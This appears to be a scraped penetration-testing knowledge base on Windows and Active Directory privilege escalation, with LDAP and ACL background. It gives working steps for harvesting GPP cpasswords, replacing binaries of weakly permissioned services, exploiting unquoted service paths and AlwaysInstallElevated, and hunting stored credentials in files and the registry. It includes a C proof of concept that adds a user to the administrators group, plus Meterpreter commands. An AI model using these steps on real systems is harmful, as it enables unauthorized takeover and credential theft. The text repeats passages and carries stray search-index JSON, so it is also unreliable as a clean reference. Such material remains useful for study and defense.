Group Policy Preference # If the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there. This is the easiest technique, and the one that should be tried first. First you need to find out which domain your user belongs to. You can do that by using the powershell Active directory module. If you do not have that module. See the helper-section to find out how to get it. You can do that with the following command: get-addomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=hackdomain,DC=local DeletedObjectsContainer : CN=Deleted Objects,DC=hackdomain,DC=local DistinguishedName : DC=hackdomain,DC=local DNSRoot : hackdomain.local DomainControllersContainer : OU=Domain Controllers,DC=hackdomain,DC=local DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-2900359584-3137434808-3022034389 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=hackdomain,DC=local Forest : hackdomain.local InfrastructureMaster : DC1337.hackdomain.local LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=hackdomain,DC=local} LostAndFoundContainer : CN=LostAndFound,DC=hackdomain,DC=local ManagedBy : Name : hackdomain NetBIOSName : HACKDOMAIN ObjectClass : domainDNS ObjectGUID : 176ed6af-a390-40f4-bbc2-e6f581089e90 ParentDomain : PDCEmulator : DC1337.hackdomain.local QuotasContainer : CN=NTDS Quotas,DC=hackdomain,DC=local ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {DC1337.hackdomain.local} RIDMaster : DC1337.hackdomain.local SubordinateReferences : {DC=ForestDnsZones,DC=hackdomain,DC=local, DC=DomainDnsZones,DC=hackdomain,DC=loca l, CN=Configuration,DC=hackdomain,DC=local} SystemsContainer : CN=System,DC=hackdomain,DC=local UsersContainer : CN=Users,DC=hackdomain,DC=local So you can clearly see hackdomain.local references everywhere. This is the domain-name. You can now go to \\\\hackdomain.local\\SYSVOL\\hackdomain.local\\policies and search for passwords there. You can either go with the explorer or with powershell. cd \\\\hackdomain.local\\SYSVOL findstr /r /s:cpassword Using PowerSploit # You can use Get-GPPPassword from powersploit to get gpp-passwords. https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-GPPPassword.ps1 You can also use Get-CachedGPPPassword . It is included in the PowerSploit Privesc module. Using Metasploit # post/windows/gather/credentials/gpp Manually # First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables # Output environment-variables set # Look for the following: LOGONSERVER=\\\\NAMEOFSERVER USERDNSDOMAIN=WHATEVER.LOCAL # Look up ip-addres nslookup nameofserver.whatever.local # It will output something like this Address: 192.168.1.101 # Now we mount it net use z: \\\\192.168.1.101\\SYSVOL # And enter it z: # Now we search for the groups.xml file dir Groups.xml /s If we find the file with a password in it, we can decrypt it like this in Kali gpp-decrypt encryptedpassword Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes 2. Services with Vulnerble Permissions # Services on windows are programs that run in the background. Without a GUI. They are almost always started and run by NT Authority. Therefore the files, folder and registry keys need correct permissions. 2.1 Insecure Registry Permissions # In Windows, information related to services is stored in HKLM\\SYSTEM\\CurrentControlSet\\Services registry key. If we want to see information about a specific service, you can check HKLM\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service . In that registry there is a key called ImagePath which contains a UNC path to the executable. So if an attacker has the permission to edit that key, the attacker can change it to point to an executable of his/hers choice. You can check if the registry is editable from the command-line but you can also check if from regedit.exe. It is uncommon that this key can be edited by a low priviliged user. But it is still something to test. References: https://pentestlab.blog/tag/imagepath/ https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ 2.2 Insecure Service Permissions # This attack is similar to the previous attack. But instead of changing the registry key we will change the Service-configuration. First we need to know which services out user has the right to configure. That can be done with the sysinternal tool accesschk.exe or with powersploit Using PowerSploit - Privesc # Enumerates all services and returns services for which the current user can modify the binPath. Get-ModifiableService Set-ServiceBinaryPath Using accesschk.exe # accesschk.exe -uwcqv \"YourUser\" * All services that \"YourUser\" can modify will be listed. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service. For more details on how to actually change the binPath and restart the service see: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Manually # First we need to find services. That can be done using wmci or sc.exe . Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use sc.exe . WMCI wmic service list brief This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icacls program. Notice that icacls is only available from Vista and up. XP and lower has cacls instead. As you can see in the command below you need to make sure that you have access to wimc , icacls and write privilege in C:\\windows\\temp . for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" Binaries in system32 are excluded since they are mostly correct, since they are installed by windows. sc.exe sc query state= all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt Now you can process them one by one with the cacls command. cacls \"C:\\path\\to\\file.exe\" Look for Weakness What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\\Users:(F) . Or where your user/usergroup has (F) or (C) rights. Example: C:\\path\\to\\file.exe BUILTIN\\Users:F BUILTIN\\Power Users:C BUILTIN\\Administrators:F NT AUTHORITY\\SYSTEM:F That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom. Here is a POC code for getsuid. #include <stdlib.h> int main () { int i; i = system(\"net localgroup administrators theusername /add\"); return 0; } We then compile it with mingw like this: i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe Restart the Service Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way: wmic service NAMEOFSERVICE call startservice net stop [service name] && net start [service name]. The binary should now be executed in the SYSTEM or Administrator context. Migrate the meterpreter shell If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this: wmic process list brief | find \"winlogon\" So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates. http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html 2.3 Insecure Service File/folder permissions # If you find a service where the low-priv user has write permissions in the of the binary that is started by the service, the user can switch the binary to an evil binary and have that binary executed by NT Authroity. PowerSploit Privesc/PowerUp # The easiest way to find these vulnerabilities is with the Powersploit. Download the PowerSploit module Privesc. Unzip it and place the entire Privesc folder in the Documents folder of your user: \\Documents\\WindowsPowerShell\\Modules\\Privesc\\ Here you can download it: https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc In order to import the module the easiest is to do the following in a powershell shell: powershell.exe -Exec bypass import-module Privesc # Check that it worked get-command -Module Privesc Now you can either run all checks to check all privesc possibilities. Or just check weak services with: invoke-AllChecks Now check for the output from Services-delen. If you have a domain-user check for files where the usergroup NT/Authenticated users can write files. If youy user can't restart the service you will have to restart the machine. 3. Unquoted Service Paths # So the idea here is that if the path to a service binary/executable is (1) not surounded by quotation-marks (\"\"), and the and the attacker has write-permissions on The basic idea is to make a service execute a malicious binary when it is started. For this to work the following conditions must be met: 1. The UNC path must not be sourounded by quotes \"\". 2. The path must contain a space, for example \\windows\\my files\\test.exe . 3. The attacker must have write-permissions the directory with space in the name. So in the case it must have write permissions in \\my files\\ . The PATH to the service binary is set in the registry. Exploit with PowerSploit # Get-UnquotedService Manually # Find Services With Unquoted Paths # Using WMIC wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" # Using sc sc query sc qc service name # Look for Binary_path_name and see if it is unquoted. If the path contains a space and is not quoted, the service is vulnerable. Exploit It If the path to the binary is: c:\\Program Files\\something\\winamp.exe We can place a binary like this c:\\program.exe When the program is restarted it will execute the binary program.exe , which we of course control. We can do this in any directory that has a space in its name. Not only program files . This attack is explained here: http://toshellandback.com/2015/11/24/ms-priv-esc/ There is also a metasploit module for this is: exploit/windows/local/trusted_service_path 4. AlwaysInstallElevated - Install new program as privileged user # This is a pretty simple privilege escalation attack. If this registry key is set a user is able to install any program. And when it is installed, it is installed as administrator. This means that if the attacker creates a install-package, .msi file, and then clicks on it, the package will be installed by the administrator/NT Authority. So if the attacker creates a install-package that adds a new privilege user the new user will be created. Check to see if the registry key is set: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated Or reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated http://toshellandback.com/2015/11/24/ms-priv-esc/ Exploit it using PowerUp.ps1 Write-UserAddMSI This will create an isntallation-file on the desktop. Once you click that you get a dialog where you can enter the new user and password you would like to create. It then gets created when you continue the installation. 5. DLL Hijacking # First check what services are running. Second, check if those services are running as LocalSystem. Third, check that the service is not a windows default service. Fourth, check if you have any directory in the PATH variable that you have write-permissions to. Now that you have enumerated the custom services that are running we need to find out if they load any DLL:s that doesn't exist. Run it locally # One way is to install the program locally on a computer where you are Administrator. You can run procmon at the same time, so that you can check what DLL:s it is trying to load. Check the executable and check for LoadLibrary functions. # I have never tried this tool, so who knows. There is a tool for this: https://github.com/Cybereason/siofra Otherwise you can maybe search for strings in the binary, take all the DLL:s that you find that it is invoking. Whether it exists or not. And then you create a malicios DLL and copy it to every name of the files you find when you searched for strings in the binary. No good method for it if you can't use Procmon. Read this https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ 6. Check installed software for exploits # Check what programs are installed on the machine, and google to to see if any of them contains local privilege escalations. 7. Cleartext Passwords / Stored credentials # Search for them # findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini #Find all those strings in config files. dir /s *pass* == *cred* == *vnc* == *.config* # Find all passwords in all files. findstr /spin \"password\" *.* findstr /spin \"password\" *.* In Common Files # These are common files to find them in. They might be base64-encoded. So look out for that. c:\\sysprep.inf c:\\sysprep\\sysprep.xml c:\\unattend.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir c:\\*vnc.ini /s /b dir c:\\*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini In Registry # # VNC reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # Windows autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # SNMP Paramters reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # Putty reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Check browser creds # So if you gotten access to a machine as another user. You can check to see if that user has stored credentials in the browser. USe the following metasploit module: run post/windows/gather/enum_chrome run post/multi/gather/firefox_creds 8. Kernel exploits # Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. Identify the hotfixes/patches systeminfo # or wmic qfe get Caption,Description,HotFixID,InstalledOn Python to Binary If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know. Service only available from inside # Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside. netstat -ano Example output: Proto Local address Remote address State User Inode PID/Program name ----- ------------- -------------- ----- ---- ----- ---------------- tcp 0.0.0.0:21 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:5900 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:6532 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 192.168.1.9:32874 TIME_WAIT 0 0 - tcp 192.168.1.9:445 192.168.1.9:40648 ESTABLISHED 0 0 - tcp 192.168.1.9:1166 192.168.1.9:139 TIME_WAIT 0 0 - tcp 192.168.1.9:27900 0.0.0.0:* LISTEN 0 0 - tcp 127.0.0.1:445 127.0.0.1:1159 ESTABLISHED 0 0 - tcp 127.0.0.1:27900 0.0.0.0:* LISTEN 0 0 - udp 0.0.0.0:135 0.0.0.0:* 0 0 - udp 192.168.1.9:500 0.0.0.0:* 0 0 - Look for LISTENING/LISTEN . Compare that to the scan you did from the outside. Does it contain any ports that are not accessible from the outside? If that is the case, maybe you can make a remote forward to access it. # Port forward using plink plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080 # Port forward using meterpreter portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.1.101 So how should we interpret the netstat output? Local address 0.0.0.0 Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it. Local address 127.0.0.1 Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us! Local address 192.168.1.9 Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us! Vulnerable Drivers # Some driver might be vulnerable.

As for now I just copy-paste the text and past it into my linux-terminal. Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user. cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM Escalate to SYSTEM from Administrator # On Windows XP and Older # If you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do Run as Administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from c:\\windows\\system32\\cmd.exe . This will give you a cmd with Administrators rights. From here we want to become SYSTEM user. To do this we run: First we check what time it is on the local machine: time # Now we set the time we want the system CMD to start. Probably one minuter after the time. at 01:23 /interactive cmd.exe And then the cmd with SYSTEM privs pops up. Vista and Newer # You first need to upload PsExec.exe and then you run: psexec -i -s cmd.exe Kitrap # On some machines the at 20:20 trick does not work. It never works on Windows 2003 for example.

You can do that with the following command: get-addomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=hackdomain,DC=local DeletedObjectsContainer : CN=Deleted Objects,DC=hackdomain,DC=local DistinguishedName : DC=hackdomain,DC=local DNSRoot : hackdomain.local DomainControllersContainer : OU=Domain Controllers,DC=hackdomain,DC=local DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-2900359584-3137434808-3022034389 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=hackdomain,DC=local Forest : hackdomain.local InfrastructureMaster : DC1337.hackdomain.local LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=hackdomain,DC=local} LostAndFoundContainer : CN=LostAndFound,DC=hackdomain,DC=local ManagedBy : Name : hackdomain NetBIOSName : HACKDOMAIN ObjectClass : domainDNS ObjectGUID : 176ed6af-a390-40f4-bbc2-e6f581089e90 ParentDomain : PDCEmulator : DC1337.hackdomain.local QuotasContainer : CN=NTDS Quotas,DC=hackdomain,DC=local ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {DC1337.hackdomain.local} RIDMaster : DC1337.hackdomain.local SubordinateReferences : {DC=ForestDnsZones,DC=hackdomain,DC=local, DC=DomainDnsZones,DC=hackdomain,DC=loca l, CN=Configuration,DC=hackdomain,DC=local} SystemsContainer : CN=System,DC=hackdomain,DC=local UsersContainer : CN=Users,DC=hackdomain,DC=local So you can clearly see hackdomain.local references everywhere.

Notice that icacls is only available from Vista and up. XP and lower has cacls instead. As you can see in the command below you need to make sure that you have access to wimc , icacls and write privilege in C:\\windows\\temp . for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" Binaries in system32 are excluded since they are mostly correct, since they are installed by windows. sc.exe sc query state= all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt Now you can process them one by one with the cacls command. cacls \"C:\\path\\to\\file.exe\" Look for Weakness What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\\Users:(F) . Or where your user/usergroup has (F) or (C) rights. Example: C:\\path\\to\\file.exe BUILTIN\\Users:F BUILTIN\\Power Users:C BUILTIN\\Administrators:F NT AUTHORITY\\SYSTEM:F That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom. Here is a POC code for getsuid. #include <stdlib.h> int main () { int i; i = system(\"net localgroup administrators theusername /add\"); return 0; } We then compile it with mingw like this: i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe Restart the Service Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way: wmic service NAMEOFSERVICE call startservice net stop [service name] && net start [service name]. The binary should now be executed in the SYSTEM or Administrator context. Migrate the meterpreter shell If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this: wmic process list brief | find \"winlogon\" So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates. http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html","title":"Manually"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#23-insecure-service-filefolder-permissions","text":"If you find a service where the low-priv user has write permissions in the of the binary that is started by the service, the user can switch the binary to an evil binary and have that binary executed by NT Authroity.","title":"2.3 Insecure Service File/folder permissions"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#powersploit-privescpowerup","text":"The easiest way to find these vulnerabilities is with the Powersploit.

GPOs contains policies that affect Users or computers. The actual policies are stored on the Domain Controller, in the share called SYSVOL: ex: \\\\contoso.local\\sysvol\\contoso.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9} Each GPO has a uniq GUID associated with it. A GPO can only apply to Users or Computers. Organizational Units (OU) OUs are just LDAP Containers, that can be used a little bit however you like. But it is usually used to logically group together Users, Groups or Computers. They are usually organized around geography (Country/City) or department (IT, Economy, HR, etc). GpLink GPOs can be linked to domains, sites, and OUs. For example, the default GPO is called Default Domain Policy and it is linked to the Domain Controller OU. The GpLink is stored on the LDAP entry that is linked to a GPO. So if you for example click on an OU, like the \"Domain Controller\" OU, you will see the attribute GpLink. The format of the \u201cgplink\u201d attribute value is [<Distinguished name of the GPO>;<0 if the link is not enforced, 1 if the link is enforced>] . GPO Enforcement Logic # GpLinks can be enforced , or not. OUs can block inheritance , or not. If a GpLink is enforced, the associated GPO will apply to the linked OU and all child objects, regardless of whether any OU in that tree blocks inheritance. If a GpLink is not enforced, the associated GPO will apply to the linked OU and all child objects, unless any OU within that tree blocks inheritance. So a GpLink is always on, even though it says that it is not enforced. The above mentioned rules apply to most scenarios. - WMI Filtering - You can further filter down to where a GPO is applied using \"WMI-Filtering\". To for example only apply the GPO to Windows 7 machines, or stuff like that. - Security Filtering - Filters so that an a GPO is only applied to specific users or computers. So who can edit a GPO? It is just a simple ACL as any ACL on any other object. You can specify that a specific GPO can be edited by a specific user or group. The user that can edit that GPO can thus takeover users or computers that that GPO is applied to. How to exploit # There are at least three different ways that an attacker can abuse GPOs to escalate privileges in a domain: - Who can create new GPOs in the domain. - Who can link GPOs to which OUs. - Who can modify existing GPOs (that may or may not be currently linked). How to check for # You will want to check for ACLs that are between a low privileged user and a GPO can controls a high privileged object, such as a computer or user. This cypher-query will check for user that Own GPOs. match path=allShortestPaths((u:User {admincount: false})-[r]->(g:GPO)) return path Check the default group policy called Default Domain Controllers Policy . Check the setting for Allow Log On Locally . If this is set to, for example, Domain Users , everyone in the domain has the permission to physically log on to the Domain Controllers .

The actual policies are stored on the Domain Controller, in the share called SYSVOL: ex: \\\\contoso.local\\sysvol\\contoso.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9} Each GPO has a uniq GUID associated with it. A GPO can only apply to Users or Computers. Organizational Units (OU) OUs are just LDAP Containers, that can be used a little bit however you like. But it is usually used to logically group together Users, Groups or Computers. They are usually organized around geography (Country/City) or department (IT, Economy, HR, etc). GpLink GPOs can be linked to domains, sites, and OUs. For example, the default GPO is called Default Domain Policy and it is linked to the Domain Controller OU. The GpLink is stored on the LDAP entry that is linked to a GPO. So if you for example click on an OU, like the \"Domain Controller\" OU, you will see the attribute GpLink. The format of the \u201cgplink\u201d attribute value is [<Distinguished name of the GPO>;<0 if the link is not enforced, 1 if the link is enforced>] .","title":"The Components"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfigured_gpo/#gpo-enforcement-logic","text":"GpLinks can be enforced , or not.

So a GpLink is always on, even though it says that it is not enforced. The above mentioned rules apply to most scenarios. - WMI Filtering - You can further filter down to where a GPO is applied using \"WMI-Filtering\". To for example only apply the GPO to Windows 7 machines, or stuff like that. - Security Filtering - Filters so that an a GPO is only applied to specific users or computers. So who can edit a GPO?

These permissions defined by the ACE can be seen if you go to any Securable Object (User, Group, or Computer) in Active Directory Users and Computers , such as the group \"Domain Admins\", or any user, and right-click and go to \"Properties\", and the click on \"Security\" and then on \"Permissions\". As mentioned above, the ACE is specified in the attribute nTSecurityDescriptor , which is the type NTSecurityDescriptor . However, reading the value from that attribute is no easy, ADExplorer parses it like shown below. The only thing that makes any sense here are the SIDs.

Delegation of control is usually performed by right-clicking on a OU and the click on Delegate Control , and then follow the wizard and add users/group/computer and specify which type of permission/control that securable object should have. In order to view the changes you first have to go to ADUC/View/Advanced Features , after that you will be able to right-click on a OU, select properties and then look at the Security tab, to see you delegated control changes. However, if you click on the actual securable object, such as a user, you will not see your changes, only if you click on TheUser/Security/Advanced/Effective Access/SelectUser . As you can see, it is easy to delegate control and then forget about it. What we are looking for is security principals that have some kind of interesting ACE on a high priviliged securable object. There are a ton of different ACEs, but only a handful are interesting from an attackers perspective. An ACE that allows the attacking user to compromise the victim user are what we are looking for. The following ACEs can do that: GenericAll - full rights to the object (add users to a group or reset user's password) GenericWrite - update object's attributes (i.e logon script) WriteOwner - change object owner to attacker controlled user take over the object WriteDACL - modify object's ACEs and give attacker full control right over the object AllExtendedRights - ability to add user to a group or reset password ForceChangePassword - ability to change user's password Self (Self-Membership) - ability to add yourself to a group Pre-requisites # Risks # How to check for # These two queries can be helpful to enumerate attackpaths from any user that is not Domain Admin to become domain admin.

Security Descriptor : A list of all Access Control Entries of that object. The Security Descriptor is just an LDAP attribute. Access Control Entry : A specification of WHO can do WHAT to a specific Securable Object. These permissions defined by the ACE can be seen if you go to any Securable Object (User, Group, or Computer) in Active Directory Users and Computers , such as the group \"Domain Admins\", or any user, and right-click and go to \"Properties\", and the click on \"Security\" and then on \"Permissions\". As mentioned above, the ACE is specified in the attribute nTSecurityDescriptor , which is the type NTSecurityDescriptor . However, reading the value from that attribute is no easy, ADExplorer parses it like shown below. The only thing that makes any sense here are the SIDs. This is how ADExplorer shows an ACE: D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;RS)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;RS)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;RS)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561) There are two types of Access Control Lists: Discrectionary Access Control List (DACL) System Access Control List (SACL) The interface for delegating control (creating ACE) in AD is not very clear. Delegation of control is usually performed by right-clicking on a OU and the click on Delegate Control , and then follow the wizard and add users/group/computer and specify which type of permission/control that securable object should have. In order to view the changes you first have to go to ADUC/View/Advanced Features , after that you will be able to right-click on a OU, select properties and then look at the Security tab, to see you delegated control changes. However, if you click on the actual securable object, such as a user, you will not see your changes, only if you click on TheUser/Security/Advanced/Effective Access/SelectUser . As you can see, it is easy to delegate control and then forget about it. What we are looking for is security principals that have some kind of interesting ACE on a high priviliged securable object. There are a ton of different ACEs, but only a handful are interesting from an attackers perspective. An ACE that allows the attacking user to compromise the victim user are what we are looking for. The following ACEs can do that: GenericAll - full rights to the object (add users to a group or reset user's password) GenericWrite - update object's attributes (i.e logon script) WriteOwner - change object owner to attacker controlled user take over the object WriteDACL - modify object's ACEs and give attacker full control right over the object AllExtendedRights - ability to add user to a group or reset password ForceChangePassword - ability to change user's password Self (Self-Membership) - ability to add yourself to a group","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#risks","text":"","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/misconfigured_access_control_lists/#how-to-check-for","text":"These two queries can be helpful to enumerate attackpaths from any user that is not Domain Admin to become domain admin.

Directory Servers # A directory server (more technically referred to as a Directory Server Agent, a Directory System Agent, or a DSA) is a type of network database that stores information represented as trees of entries. This is different from a relational database, which uses tables comprised of rows and columns, so directory servers may be considered a type of NoSQL database (even though directory servers have been around a lot longer than the term NoSQL has). While virtually all directory servers support LDAP, some servers offer support for additional protocols that can be used to interact with the data. Some of these protocols include X.500 (the original Directory Access Protocol, for which LDAP is a much more lightweight version), naming service protocols like DNS and NIS, HTTP-based protocols like DSML and SCIM, and proprietary protocols like Novell\u2019s NDS. The Directory Server interesting to us is of course Microsoft Active Directory. Entries # An LDAP entry is a collection of information about an entity (like a user or a computer). Each entry consists of three primary components: a distinguished name (DN) a collection of attributes a collection of object classes. DNs and RDNs # An entry\u2019s distinguished name, often referred to as a DN, uniquely identifies that entry and its position in the directory information tree (DIT) hierarchy. The DN of an LDAP entry is much like the path to a file on a filesystem. An LDAP DN is comprised of zero or more elements called relative distinguished names, or RDNs. Each RDN is comprised of one or more (usually just one) attribute-value pairs. For example, \"uid=john.doe\" represents an RDN comprised of an attribute named \"uid\" with a value of \"john.doe\". If an RDN has multiple attribute-value pairs, they are separated by plus signs, like \"givenName=John+sn=Doe\". The special distinguished name comprised of zero RDNs (and therefore has a string representation that is just an empty string) is sometimes called the \u201cnull DN\u201d and references a special type of entry called the root DSE which provides information about the content and capabilities of the directory server. For DNs with multiple RDNs, the order of the RDNs specifies the position of the associated entry in the DIT. RDNs are separated by commas, and each RDN in a DN represents a level in the hierarchy in descending order (i.e., moving closer to the root of the tree, which is called the naming context). That is, if you remove an RDN from a DN, you get the DN of the entry considered the parent of the former DN. For example, the DN \"uid=john.doe,ou=People,dc=example,dc=com\" has four RDNs, with the parent DN being \"ou=People,dc=example,dc=com\". A Distinguished Name (DN) should be read from left to right. The RDNs more to the left represent the higher branches of a tree. The RDN to the far right represent the trunk of the tree. The Distinguished Name of an active directory : cn=Philip L,cn=users,dc=evilcorp,dc=local This is a Relative Distinguished Name: dc=local Attributes # Attributes hold the data for an entry. Each attribute has an attribute type, zero or more attribute options, and a set of values that comprise the actual data. Attribute types are schema elements that specify how attributes should be treated by LDAP clients and servers. All attribute types must have an object identifier (OID) and zero or more names that can be used to reference attributes of that type. They must also have an attribute syntax, which specifies the type of data that can be stored in attributes of that type, and a set of matching rules, which indicate how comparisons should be performed against values of attributes of that type. Attribute types may also indicate whether an attribute is allowed to have multiple values in the same entry, and whether the attribute is intended for holding user data (a user attribute) or is used for the operation of the server (an operational attribute). Operational attributes are typically used for configuration and/or state information. Attribute options are not used all that often, but may be used to provide some metadata about an attribute. For example, attribute options may be used to provide different versions of a value in different languages. Examples of attribute types are: OctetString , Integer8 , Integer , DirectoryString , Boolean , DN , OID , Sid , GeneralizedTime . Object Classes # Object classes are schema elements that specify collections of attribute types that may be related to a particular type of object, process, or other entity. Every entry has a structural object class, which indicates what kind of object an entry represents (e.g., whether it is information about a person, a group, a device, a service, etc.), and may also have zero or more auxiliary object classes that suggest additional characteristics for that entry. Like attribute types, object classes must have an object identifier, but they may also have zero or more names. Object classes may also list a set of required attribute types (so that any entry with that object class must also include those attributes) and/or a set of optional attribute types (so that any entry with that object class may optionally include those attributes). Object Identifiers (OIDs) # An object identifier (OID) is a string that is used to uniquely identify various elements in the LDAP protocol, as well as in other areas throughout computing. OIDs consist of a sequence of numbers separated by periods (e.g., \"1.2.840.113556.1.4.473\" is the OID that represents the server-side sort request control). In LDAP, OIDs are used to identify things like schema elements (like attribute types, object classes, syntaxes, matching rules, etc.), controls, and extended requests 